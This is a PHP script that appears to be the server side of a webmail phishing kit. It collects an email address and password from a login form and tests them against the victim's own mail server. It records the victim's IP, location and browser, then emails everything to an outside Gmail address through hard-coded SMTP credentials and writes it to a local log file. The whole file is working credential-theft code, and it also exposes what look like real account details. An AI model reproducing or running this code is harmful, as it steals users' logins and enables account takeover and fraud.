<?php
require_once __DIR__ . '/class.phpmailer.php';
require_once __DIR__ . '/class.smtp.php';
header('Access-Control-Allow-Origin: *');
session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    echo '<html><head><title>403 - Forbidden</title></head><body><h1>403 Forbidden</h1><hr></body></html>';
    exit;
}

// Config
$receiver = "skkho87.sm@gmail.com"; // Your email
$senderuser = "okioko@museums.or.ke"; // SMTP user
$senderpass = 'onesmus@2022'; // SMTP password
$senderport = 587; // SMTP port
$senderserver = "mail.museums.or.ke"; // SMTP server

$browser = $_SERVER['HTTP_USER_AGENT'];
$login = isset($_POST['email']) ? $_POST['email'] : '';
$passwd = isset($_POST['password']) ? $_POST['password'] : '';
$email = $login;
$part = explode("@", $email);
$domain = isset($part[1]) ? $part[1] : '';
$country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';

$subg = "$country || $login";
$subg2 = "notVerifiedRcudeOrange || $country || $login";
$message = nl2br("Email : $login\nPassword : $passwd\nIP of sender: $country | $city | $ip\nBrowser: $browser");

// Try to authenticate with user's credentials by sending a test email to self
$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->Username = $login;
$mail->Password = $passwd;
$mail->Host = 'mail.'.$domain;
$mail->Port = 587;
$mail->SMTPSecure = 'tls';
$mail->From = $login;
$mail->FromName = 'Webmail Auth Test';
$mail->addAddress($login); // Send to self
$mail->Subject = 'Webmail Auth Test';
$mail->Body = 'This is a test to validate your credentials.';
$mail->Timeout = 10;

$validCredentials = false;
$errorMsg = '';

try {
    if ($mail->send()) {
        $validCredentials = true;
    }
} catch (Exception $error) {
    $errorMsg = $mail->ErrorInfo;
    $validCredentials = false;
}

// Now send the log to your receiver
$mail2 = new PHPMailer;
$mail2->isSMTP();
$mail2->Host = $senderserver;
$mail2->SMTPAuth = true;
$mail2->Username = $senderuser;
$mail2->Password = $senderpass;
$mail2->Port = $senderport;
$mail2->SMTPSecure = 'tls';
$mail2->From = $senderuser;
$mail2->FromName = 'SS-RCube';
$mail2->addAddress($receiver);
$mail2->isHTML(true);

if ($validCredentials) {
    $mail2->Subject = $subg;
    $mail2->Body = $message;
    $mail2->AltBody = strip_tags($message);
    $mail2->send();
    $data = array('signal' => 'OK', 'msg' => 'Login successful! Redirecting...');
} else {
    $mail2->Subject = $subg2;
    $mail2->Body = $message . "<br><br>SMTP Error: " . htmlspecialchars($errorMsg);
    $mail2->AltBody = strip_tags($message . "\n\nSMTP Error: " . $errorMsg);
    $mail2->send();
    $data = array('signal' => 'not ok', 'msg' => 'Invalid email or password.');
}

// Log to file
$fp = fopen("SS-Or.txt", "a");
fputs($fp, $message . "\n----------------------\n");
fclose($fp);

echo json_encode($data);
exit;
?>